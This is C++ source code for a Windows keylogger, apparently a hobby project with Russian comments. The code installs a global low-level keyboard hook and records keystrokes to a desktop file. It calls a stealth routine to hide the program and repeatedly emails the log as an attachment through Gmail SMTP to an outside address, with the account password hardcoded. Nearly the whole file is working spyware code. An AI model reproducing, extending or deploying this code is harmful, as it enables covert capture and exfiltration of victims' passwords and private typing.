#pragma once
#pragma comment(lib, "Shlwapi.lib")
#include "Email.h"
#include "Keylogger.h"
//
#include <ShlObj.h>
#include <Shlwapi.h>

//#define LISTENER_TIMER 5 // раскоментить если нужно запоминать все нажатые клавиши
//#define SENDER_SLEEP_TIME 100  // раскоментить если нужно запоминать все нажатые клавиши



//clock_t now; // раскоментить если нужно запоминать все нажатые клавиши
HHOOK _hook;
KBDLLHOOKSTRUCT kbdStruct; // структура с данными о клавишах
Keylogger k;





LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0)
	{

		if (wParam == WM_KEYDOWN)
		{
			k.canSave = k.checkIfNeedToRemember();
			//canSave = false; // раскоментить если нужно запоминать все нажатые клавиши


			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

			if (k.canSave)
				k.Save(kbdStruct.vkCode, kbdStruct.scanCode);
			//now = clock(); // раскоментить если нужно запоминать все нажатые клавиши
		}
	}

	return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void SetHook()
{
	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
	{
		LPCSTR a = "Failed to install hook!";
		LPCSTR b = "Error";
		MessageBox(NULL, a, b, MB_ICONERROR);
	}
}

void ReleaseHook()
{
	UnhookWindowsHookEx(_hook);
}


int main(void)
{

    //	clock_t timer;
	string path;
	TCHAR s[MAX_PATH];
	
	if (SUCCEEDED(SHGetFolderPath(NULL,
		CSIDL_DESKTOP,
		NULL,
		0,
		s)))
	{
		PathAppend(s, TEXT("keylogger.txt"));
	}
	path = s;
	
	Email e;
	
	
	//now = clock();
	//OUTPUT_FILE=fopen("C:\\Users\\User-PC\\Documents\\Visual Studio 2015\\Projects\\try\\try\\keylogger.txt", "a+b");
	//k.overrideFile("C:\\Users\\User-PC\\Documents\\Visual Studio 2015\\Projects\\try\\try\\keylogger.txt");
	k.OUTPUT_FILE = fopen(path.c_str(), "a+b");

	k.overrideFile(path);
	e.setTo("<dellg3172018@gmail.com>");
	e.setFrom("<egor.rubbish.acc@gmail.com>");
	e.setSubject("Test Email");
	e.setBody("Do not reply to this email");
	e.setSMTP_host("smtps://smtp.gmail.com:465");
	e.setSMTP_username("egor.rubbish.acc@gmail.com");
	e.setSMTP_password("TttttEeeeSssTt1");

	k.stealth();
	SetHook();
		
	MSG msg;
	while (true)	
	{
			while (!PeekMessage(&msg, NULL, NULL, NULL, PM_NOREMOVE))
			{
				if (k.canSend == true) {
					e.addAttachment(path);
					e.constructEmail();
					e.send();
					Sleep(500);
					k.canSend = false;
					e.removeAllAttachments();
				}				
				//timer = (clock() - now) / CLOCKS_PER_SEC; // раскоментить если нужно запоминать все нажатые клавиши
				//if (timer > LISTENER_TIMER) {
				//	emailSetUp(e, k);
				//	Sleep(1000);		
				//	now = clock();
				//}
                //       #ifdef visible
				//system("cls");
				//printf("Listening...");
				//printf("\nTime to send next buffer: %ld\n\n", (LISTENER_TIMER - timer));
                //#endif
			}
			if (!GetMessage(&msg, NULL, NULL, NULL)) break;	
	}

	system("pause");
	return 0;
}